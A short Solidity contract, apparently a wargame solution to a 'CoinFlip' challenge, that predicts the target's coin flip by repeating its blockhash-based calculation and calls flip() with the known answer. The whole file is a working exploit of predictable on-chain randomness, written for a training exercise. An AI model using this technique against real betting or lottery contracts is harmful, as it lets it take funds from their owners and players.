// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract Guess {
    CoinFlip coinFlipContract;
    uint256 public coinFlipContractconsecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip){
        coinFlipContract = _coinFlip; 
    }

    function guessOutcome() public returns(bool){

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        return coinFlipContract.flip(side);
    }
}